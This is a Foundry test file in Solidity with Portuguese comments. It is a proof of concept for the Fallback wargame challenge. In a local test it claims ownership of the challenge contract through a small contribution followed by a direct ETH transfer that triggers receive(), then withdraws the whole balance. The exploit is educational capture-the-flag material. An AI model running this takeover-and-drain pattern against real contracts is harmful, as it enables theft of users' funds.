// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {Fallback} from "../src/Fallback.sol";

/**
 * @title TesteFallback
 * @notice Prova de Conceito (PoC) demonstrando a tomada de propriedade e dreno de fundos do desafio Fallback.
 */
contract TesteFallback is Test {
    Fallback public alvo;
    address public donoOriginal = makeAddr("donoOriginal");
    address public auditor = makeAddr("auditor");

    function setUp() public {
        // Implanta o contrato como o dono legítimo
        vm.deal(donoOriginal, 10 ether);
        vm.prank(donoOriginal);
        alvo = new Fallback();
        
        // Simula 10 ETH armazenados no contrato alvo
        vm.deal(address(alvo), 10 ether);
    }

    function testExploitFallback() public {
        console.log("Dono inicial:", alvo.owner());
        console.log("Saldo inicial do contrato:", address(alvo).balance / 1e18, "ETH");

        // Concede 1 ETH ao auditor para realizar as transações do teste
        vm.deal(auditor, 1 ether);

        // Inicia a impersonação contínua do endereço do auditor
        vm.startPrank(auditor);

        // Passo 1: Realiza uma contribuição mínima (< 0.001 ETH) para registrar contributions[auditor] > 0
        alvo.contribute{value: 0.0001 ether}();

        // Passo 2: Envia ETH diretamente para o endereço do contrato (sem chamar função),
        // acionando a função receive() e assumindo a variável `owner`
        (bool enviado, ) = address(alvo).call{value: 0.0001 ether}("");
        require(enviado, "Falha ao enviar ETH");

        // Passo 3: Com privilégios de `owner` obtidos, saca todo o saldo do contrato
        alvo.withdraw();

        vm.stopPrank();

        console.log("Novo dono:", alvo.owner());
        console.log("Saldo final do contrato:", address(alvo).balance / 1e18, "ETH");
        console.log("Saldo final do auditor:", auditor.balance / 1e18, "ETH");

        // Validações: confirma a troca de dono e o esvaziamento completo do contrato
        assertEq(alvo.owner(), auditor);
        assertEq(address(alvo).balance, 0);
    }
}